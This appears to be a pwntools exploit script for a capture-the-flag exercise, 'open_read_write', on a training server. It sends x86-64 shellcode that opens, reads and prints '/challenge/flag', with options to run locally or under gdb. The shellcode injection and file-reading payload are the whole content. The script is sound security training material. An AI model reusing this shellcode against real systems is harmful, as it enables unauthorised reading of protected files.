from pwn import *

COMMANDS = """
break *0x0000000000401534
break *0x000000000040153e
c
"""

context.arch = "amd64" 

exploit = """
xor rsi, rsi         
mov rsi, 0x0067616c662f6567
push rsi
xor rsi, rsi
mov rsi, 0x6e656c6c6168632f
push rsi
mov rdi, rsp
mov rax, 2
xor rsi, rsi
xor rdx, rdx
syscall               
mov rdi, rax					
xor rax, rax          
mov rdx, 50          
mov rsi, rsp          
syscall
mov rax, 1           
mov rdi, 1
mov rdx, 50
mov rsi, rsp
syscall
"""

if args.REMOTE:
    c = remote("open-read-write.training.offensivedefensive.it", 8080, ssl=True)
else:
    if args.GDB:
        c = gdb.debug("./open_read_write" , gdbscript=COMMANDS)
    else:
        c = process("./open_read_write")


assembled_exploit = asm(exploit)

c.send(assembled_exploit)

c.interactive()